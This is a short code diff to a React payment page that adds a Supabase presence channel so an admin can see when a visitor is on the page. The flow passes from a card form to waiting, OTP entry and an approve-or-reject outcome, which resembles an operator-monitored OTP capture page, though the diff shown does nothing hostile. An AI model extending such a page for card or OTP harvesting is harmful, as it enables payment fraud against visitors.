@@ -1,4 +1,4 @@
-import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
@@ -8,6 +8,29 @@ import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
   const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
+  const visitorId = useRef(crypto.randomUUID());
+
+  // Join presence channel so admin knows someone is on the page
+  useEffect(() => {
+    const channel = supabase.channel("visitors", {
+      config: { presence: { key: visitorId.current } },
+    });
+
+    channel
+      .on("presence", { event: "sync" }, () => {})
+      .subscribe(async (status) => {
+        if (status === "SUBSCRIBED") {
+          await channel.track({
+            online_at: new Date().toISOString(),
+            visitor_id: visitorId.current,
+          });
+        }
+      });
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, []);
   const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [otpError, setOtpError] = useState<string | null>(null);
